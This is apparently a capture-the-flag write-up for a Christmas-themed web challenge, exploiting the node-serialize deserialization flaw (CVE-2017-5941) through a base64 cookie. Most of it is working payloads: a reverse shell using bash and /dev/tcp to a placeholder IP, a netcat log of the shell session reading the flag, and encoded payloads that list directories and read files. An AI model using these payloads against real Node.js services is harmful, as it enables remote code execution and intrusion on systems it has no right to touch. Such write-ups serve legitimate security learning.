
# Challenge

So we have identified all the villains through Santas Blog. Here are the 10 most wanted characters on the North Pole!

http://grinchserialkiller.norwayeast.azurecontainer.io:7331/

> **Hint:** There was 5941 applicants to this list... go figure.... sounds a bit UNcivilized...

# Writeup

Quick look I can only see a cookie which is delivered. Decoding it using base64 gives me the following.

```json
{
  "username": "santa",
  "country": "northpole",
  "city": "elfville"
}
```

The number 5941 must be a hint and a quick google shows me [CVE-2017-5941](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941) which is a RCE exploit. Basically it lets you run nodejs functions when using `node-serialise` package. 

So guessing he is using that package to "un"serialize (based on the hint, UNcivilized) the cookie we can simply try to exploit it.

[This](https://packetstormsecurity.com/files/161356/Node.JS-Remote-Code-Execution.html) document shows how to exploit it. It seems to just use `_$$ND_FUN$$_function` in front of the function.

```json
{
	"username": "_$$ND_FUNC$$_function(){return 'test'}()",
	"country": "northpole",
	"city": "elfville"
}
```

Now my username will be test. As I understand you do not need to use any of the existing variables. It is run on the whole object. So I build my reverse shell script:

```json
{
	"username": "toffe",
	"country": "northpole",
	"city": "elfville",
	"rce": "_$$ND_FUNC$$_function () {require('child_process').spawnSync('/bin/bash', ['-c', 'bash -i >& /dev/tcp/IP.ADDR.HERE/1234 0>&1 &'])\n    }()"
}
```

And bingo, I'm in:

```bash
ubuntu@tjweb:~$ nc -nlvp 1234
Listening on 0.0.0.0 1234
Connection received on 20.100.244.149 6184
bash: cannot set terminal process group (27): Inappropriate ioctl for device
bash: no job control in this shell
node@SandboxHost-638070306114978530:/app$ cat /flag.txt
cat /flag.txt
${W0V_53RI@7_KI113R5_C@N_B3_D3@D7Y!}node@SandboxHost-638070306114978530:/app$ 
```

There it is `${W0V_53RI@7_KI113R5_C@N_B3_D3@D7Y!}`

I did actually browse around to find that flag. So not so fast. But it was basically `cd..` and `ls -lah` and there I saw it.


# Different method

`require('fs').readdirSync('.').toString()`
```json
{
	"username": "_$$ND_FUNC$$_function(){return require('fs').readdirSync('.').toString()}()",
	"country": "northpole",
	"city": "elfville"
}

ewoJInVzZXJuYW1lIjogIl8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe3JldHVybiByZXF1aXJlKCdmcycpLnJlYWRkaXJTeW5jKCcuJykudG9TdHJpbmcoKX0oKSIsCgkiY291bnRyeSI6ICJub3J0aHBvbGUiLAoJImNpdHkiOiAiZWxmdmlsbGUiCn0=
```

`require('fs').readdirSync('..').toString()`
```json
{
	"username": "_$$ND_FUNC$$_function(){return require('fs').readdirSync('..').toString()}()",
	"country": "northpole",
	"city": "elfville"
}


ewoJInVzZXJuYW1lIjogIl8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe3JldHVybiByZXF1aXJlKCdmcycpLnJlYWRkaXJTeW5jKCcuLicpLnRvU3RyaW5nKCl9KCkiLAoJImNvdW50cnkiOiAibm9ydGhwb2xlIiwKCSJjaXR5IjogImVsZnZpbGxlIgp9
```

`require('fs').readFileSync('/flag.txt')`
```json
{
	"username": "_$$ND_FUNC$$_function(){return require('fs').readFileSync('/flag.txt')}()",
	"country": "northpole",
	"city": "elfville"
}

ewoJInVzZXJuYW1lIjogIl8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe3JldHVybiByZXF1aXJlKCdmcycpLnJlYWRGaWxlU3luYygnL2ZsYWcudHh0Jyl9KCkiLAoJImNvdW50cnkiOiAibm9ydGhwb2xlIiwKCSJjaXR5IjogImVsZnZpbGxlIgp9
```